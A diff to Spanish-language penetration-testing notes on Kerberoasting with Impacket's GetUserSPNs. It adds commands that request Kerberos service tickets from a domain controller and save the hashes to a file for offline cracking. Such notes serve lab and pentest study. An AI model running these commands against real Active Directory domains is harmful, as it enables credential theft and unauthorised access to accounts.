@@ -24,10 +24,11 @@ GetUserSPNs en Impacket: La funcionalidad GetUserSPNs se utiliza específicament
 ## Obtener Hash con Impacket-GetUsersSPNs
 
 ```bash 
-❯ impacket-GetUserSPNs domain.corp/user:Password     # Ver si el usuario es Kerberosteable y lista los usuarios a los que puedes solicitar un TGS
+❯ impacket-GetUserSPNs domain.corp/user:Password     # Mirar si el usuario es Kerberosteable y listar los usuarios a los que se le puede solicitar un TGS
 
-❯ impacket-GetUserSPNs domain1.corp/user:Password -dc-ip IP -request
-
+❯ impacket-GetUserSPNs domain1.corp/user:Password -dc-ip IP -request  # Solicitar un TGS 
+❯ impacket-GetUserSPNs domain1.corp/user:Password -dc-ip IP -request -outputfile kerb.txt  # Solicitar varios TGS
+	
 	# dc-ip = Dirección IP del DC
 	# domain1 = Dominio 
 	# user = Usuario valido del dominio 
@@ -35,6 +36,7 @@ GetUserSPNs en Impacket: La funcionalidad GetUserSPNs se utiliza específicament
 
 Notas:
 	1. Tener la IP con el dominio en '/etc/hosts'
+	2. Cuando hay varios TGS para un usuario es mejor crear un archivo para extraer los hashes. De lo contrario no saldrán los hashes por consola 
 ```
 
 ## Crackear el Hash obtenido 
